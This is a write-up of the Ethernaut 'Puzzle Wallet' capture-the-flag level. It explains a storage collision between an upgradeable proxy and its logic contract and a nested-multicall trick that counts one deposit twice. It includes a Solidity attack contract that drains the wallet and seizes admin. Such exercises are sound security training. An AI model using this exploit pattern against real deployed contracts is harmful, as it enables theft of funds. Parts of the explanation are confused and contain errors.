# Level 24: [Puzzle wallet](https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f)

## Level objectives:
Become admin of proxy contract.
## Analysis
- Storage collisions:
```sol
// contract 1
address public pendingAdmin; // slot 0
address public admin; // slot 1
// the above two in diff slots cuz total would be 40 bytes = 320 bits which is more than a single slot can tak (256 bits)

// contract 1
address public owner; // slot 0
uint256 public maxBalance; // slot 1
```
- Note on upgradeable proxies: all functions are called on it; if that function is not defined in it, it calls `fallback` which forwadrs the call to the logic contract.
- Storage collision allows us to modify `admin` if we can modify `maxBalance`. To modify `maxBalance`, we need to be whitelisted. To edit whitelist, we need to be `owner`. To become owner we can overwrite it using `pendingAdmin` is it shares the same slot (0). (NOTE: but this happens if the `delegatecall` to another contract modifies the caller's storage. In this case the caller is modifying the callee's state. HOW!!???)
- After entering the whitelist we attack using the multicall function, which enables us to batch-execute multiple calls.
- But it tries to prevent us from executing `deposite` multiple times (checks using the function selector), but we go around this by re-executing `deposit` _via_ another multicall.

## Code:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface PuzzleProxy {...}

interface PuzzleWallet {...}

contract AttackPuzzleWallet {

    PuzzleProxy proxy = PuzzleProxy(0x151C0ED13FC81B04Dd8499E7317a2484d7b68850);
    PuzzleWallet wallet = PuzzleWallet(0x151C0ED13FC81B04Dd8499E7317a2484d7b68850);

    function attack() external{
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        proxy.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        wallet.execute(msg.sender, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
```
